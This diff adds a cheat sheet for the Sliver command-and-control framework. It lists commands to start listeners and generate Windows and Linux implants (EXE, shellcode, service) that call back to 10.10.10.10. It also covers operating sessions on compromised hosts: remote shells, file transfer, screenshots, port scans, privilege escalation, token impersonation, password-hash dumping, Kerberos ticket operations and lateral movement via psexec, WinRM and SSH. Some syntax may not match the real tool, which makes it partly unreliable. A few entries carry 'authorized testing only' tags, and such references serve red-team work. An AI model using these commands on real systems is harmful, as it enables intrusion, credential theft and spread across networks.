@@ -1,0 +1,127 @@
+[X] Sliver Command List
+
+[\] sliver-server
+[/] Start Sliver C2 server
+
+[\] sliver-client
+[/] Connect to Sliver server
+
+[\] help
+[/] Show help menu
+
+[\] new-listener http --lhost 0.0.0.0 --lport 80
+[/] Create HTTP listener
+
+[\] new-listener https --lhost 0.0.0.0 --lport 443
+[/] Create HTTPS listener
+
+[\] new-listener mtls --lhost 0.0.0.0 --lport 8888
+[/] Create mutual‑TLS listener
+
+[\] listeners
+[/] List active listeners
+
+[\] stop-listener <name>
+[/] Stop a listener
+
+[\] generate --http 10.10.10.10:80 --os windows
+[/] Generate Windows payload (HTTP)
+
+[\] generate --mtls 10.10.10.10:8888 --os linux
+[/] Generate Linux payload (mTLS)
+
+[\] generate --format exe --save payload.exe
+[/] Save payload as EXE
+
+[\] generate --format shellcode
+[/] Generate raw shellcode
+
+[\] generate --format service
+[/] Generate Windows service payload
+
+[\] sessions
+[/] List active sessions
+
+[\] use <session>
+[/] Interact with a session
+
+[\] info
+[/] Show session info
+
+[\] background
+[/] Background current session
+
+[\] kill <session>
+[/] Terminate session
+
+[\] shell
+[/] Open interactive shell
+
+[\] execute <cmd>
+[/] Run command on target
+
+[\] upload <file>
+[/] Upload file to target
+
+[\] download <file>
+[/] Download file from target
+
+[\] ps
+[/] List processes
+
+[\] killpid <pid>
+[/] Kill process by PID
+
+[\] netstat
+[/] Show network connections
+
+[\] ifconfig
+[/] Show network interfaces
+
+[\] screenshot
+[/] Capture screenshot
+
+[\] portscan <ip> --ports 1-1000
+[/] Internal port scan
+
+[\] getsystem
+[/] Attempt privilege escalation (authorized testing only)
+
+[\] impersonate <user>
+[/] Token impersonation (authorized testing only)
+
+[\] rev2self
+[/] Revert to original token
+
+[\] hashdump
+[/] Dump local password hashes (authorized testing only)
+
+[\] kerberos
+[/] Kerberos ticket operations
+
+[\] psexec <target> <payload>
+[/] Execute payload via SMB (authorized testing only)
+
+[\] winrm <target> <payload>
+[/] Execute payload via WinRM (authorized testing only)
+
+[\] ssh <target> <payload>
+[/] Execute payload via SSH
+
+[\] beacons
+[/] List beacon implants
+
+[\] jobs
+[/] List running jobs
+
+[\] stop <jobid>
+[/] Stop a job
+
+[\] loot
+[/] Show collected loot
+
+[\] profiles
+[/] List C2 profiles
+
+[\] operators
+[/] List connected operators
